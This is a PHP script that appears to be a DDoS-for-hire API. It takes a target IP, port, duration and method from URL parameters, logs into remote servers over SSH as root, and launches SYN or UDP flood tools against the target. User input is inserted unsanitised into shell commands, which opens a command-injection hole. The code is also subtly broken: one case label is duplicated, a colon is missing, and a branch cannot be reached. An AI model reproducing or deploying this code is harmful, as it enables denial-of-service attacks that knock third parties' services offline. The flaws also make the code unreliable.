<?php

set_time_limit(0);
ignore_user_abort(true);

if (!function_exists("ssh2_connect")) 
{
die("function ssh2_connect doesn't exist");
}

$servers = array(
array(
'ip' => '127.0.0.1', 
'port' => 22,
'user' => 'root',
'pass' => 'pass'
)
);

if(isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'])) 
{
$messages = array();

foreach($servers as $server) 
{
$con = ssh2_connect($server['ip'], $server['port']);

if(!$con) 
{
$messages[] = array('status' => 'unable_to_connect');
break;
} 
else 
{
if(!ssh2_auth_password($con, $server['user'], $server['pass'])) 
{
$messages[] = array('status' => 'unable_to_auth');
break;
} 
else 
{
switch($_GET['method']) 
{
case 'ssyn':
$stream = ssh2_exec($con, "screen ./ssyn ".$_GET['host']." ".$_GET['port']." 200 -1 ".$_GET['time']);
break;
case 'ssyn':
$stream = ssh2_exec($con, "screen ./udp ".$_GET['host']." ".$_GET['port']." 65550 ".$_GET['time']);
break;
case 'stop'
$stream = ssh2_exec($con, "killall -15 screen");
break;

default: 
$messages[] = array('status' => 'invalid_method', 'message' => 'Valid methods: ssyn');
break;
break;
}

if (!$stream) 
{
$messages[] = array('status' => 'unable_to_execute');
break;
} 
else 
{
$messages[] = array('status' => 'attack_sent', 'server' => $server['ip'], 'response' => stream_get_contents($stream));
}
}
}
}

echo json_encode($messages);
} 
else 
{
echo json_encode(array('status' => 'invalid_format', 'message' => 'Valid format: api.php?host=TARGET_IP&port=TARGET_PORT&time=ATTACK_LENGTH&method=ATTACK_METHOD'));
}

?>